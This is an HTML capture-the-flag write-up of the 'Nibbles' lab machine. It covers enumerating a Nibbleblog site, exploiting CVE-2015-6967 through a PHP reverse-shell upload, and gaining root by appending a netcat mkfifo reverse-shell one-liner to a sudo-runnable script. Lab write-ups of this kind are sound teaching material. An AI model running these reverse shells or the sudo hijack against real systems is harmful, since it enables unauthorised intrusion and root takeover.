@@ -1,0 +1,89 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Nibbles</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="../../assets/css/writeups_style.css" type="text/css" />
+</head>
+<body>
+  <div class="page">
+    <h1 class="title">Nibbles</h1>
+
+    <section>
+      <h2>Initial Reconnaissance</h2>
+      <p>
+        I begin by performing a port scan to identify exposed services. The scan reveals that SSH and HTTP are open.
+      </p>
+      <p>
+        Since HTTP is available, I start by accessing the web application through the browser.
+      </p>
+    </section>
+
+    <section>
+      <h2>Web Enumeration</h2>
+      <p>
+        While inspecting the page source, I find a comment that references a directory related to Nibbleblog.
+      </p>
+      <p>
+        I perform a directory enumeration against the following path:
+      </p>
+      <div class="code-block">
+        <pre><code>dirb http://10.10.10.75/nibbleblog/</code></pre>
+      </div>
+      <p>
+        During enumeration, I discover a login page and a README file. Inside the README, I find the exact version of Nibbleblog running on the server.
+      </p>
+      <img src="images/36-1.png" alt="Nibbleblog README and version">
+    </section>
+
+    <section>
+      <h2>Vulnerability Identification</h2>
+      <p>
+        Using <strong>searchsploit</strong>, I find that this version of Nibbleblog is vulnerable to <strong>CVE-2015-6967</strong>.
+      </p>
+      <img src="images/36-2.png" alt="Searchsploit results">
+      <p>
+        One of the configuration files reveals that there is a user named <strong>admin</strong>.
+      </p>
+      <p>
+        After testing several credentials, I discover that using the blog name as the password grants access to the admin dashboard. This information is referenced inside the <strong>config.xml</strong> file.
+      </p>
+    </section>
+
+    <section>
+      <h2>File Upload & Reverse Shell</h2>
+      <p>
+        Once inside the dashboard, I upload a malicious PHP file to obtain a reverse shell. For this step, I use the PHP reverse shell from Pentestmonkey.
+      </p>
+      <p>
+        After uploading the file, I access it from the following path to trigger the shell:
+      </p>
+      <div class="code-block">
+        <pre><code>http://10.10.10.75/nibbleblog/content/private/plugins/my_image/</code></pre>
+      </div>
+      <img src="images/36-3.png" alt="Reverse shell obtained">
+    </section>
+
+    <section>
+      <h2>Privilege Escalation</h2>
+      <p>
+        With an initial shell, I run <strong>sudo -l</strong> and discover that I can execute a specific <strong>.sh</strong> script as root.
+      </p>
+      <img src="images/36-4.png" alt="sudo -l output">
+      <p>
+        I unzip the script and modify it by appending a reverse shell payload. This allows me to escalate privileges when the script is executed with sudo.
+      </p>
+      <div class="code-block">
+        <pre><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &lt;IP&gt; &lt;PORT&gt; >/tmp/f' | tee -a monitor.sh</code></pre>
+      </div>
+      <p>
+        After executing the script with sudo, I successfully obtain a root reverse shell.
+      </p>
+      <img src="images/36-5.png" alt="Root shell">
+    </section>
+
+  </div>
+</body>
+
+</html>
